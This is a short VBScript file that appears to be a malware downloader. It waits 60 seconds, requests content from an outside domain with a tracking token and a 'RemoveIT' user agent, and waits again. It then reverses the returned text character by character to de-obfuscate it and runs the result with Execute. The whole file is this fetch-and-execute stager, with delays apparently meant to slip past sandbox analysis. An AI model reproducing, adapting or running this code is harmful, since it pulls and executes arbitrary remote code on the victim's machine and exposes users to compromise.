QhaS9="5zKt6TCImBzb5nxHU7paOcWs8"
URL="http://lastgoltda.info/?c=v3&" & QhaS9
set Isbox=CreateObject("Microsoft.XMLHTTP")
WScript.Sleep 60000
Isbox.open "GET",URL,false
Isbox.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
Isbox.setRequestHeader "User-Agent", "RemoveIT"
Isbox.send "Z"
WScript.Sleep 60000
For i = Len(Isbox.responsetext) to 1  Step-1
    var= Mid(Isbox.responsetext,  i  , 1)
    OQjhD = OQjhD & var
Next

execute "Execute OQjhD & QhaS9Isbox"
